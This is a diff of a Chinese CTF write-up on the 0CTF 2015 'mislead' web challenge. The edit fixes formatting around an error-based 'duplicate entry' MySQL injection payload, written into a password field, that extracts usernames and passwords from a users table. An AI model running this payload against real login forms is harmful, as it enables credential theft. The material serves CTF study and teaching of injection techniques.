@@ -10,7 +10,7 @@ tags:
 
 详见[原文链接](http://www.pwntester.com/blog/2015/03/30/0ctf-2015-mislead-web-300/)
 
- `Duplicate entry technique` 经典注入语句
+# `Duplicate entry technique` 经典注入语句
  
 `Get the DB`:
 {% highlight php %}
@@ -44,7 +44,7 @@ SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry `'password
 
 `Get the first user`:
 {% highlight php %}
- username=pwner10&password='),(select 1 from (select count(*),concat((select(select concat(cast(concat(`username`,0x7e,`password`) as char),0x7e)) from users limit `0`,1),floor(rand(0)*2))x from information_schema.tables group by x)a)   );#&submit=Submit
+ username=pwner10&password='),(select 1 from (select count(*),concat((select(select concat(cast(concat(username,0x7e,password) as char),0x7e)) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)   );#&submit=Submit
 {% endhighlight %}
 Output:
 
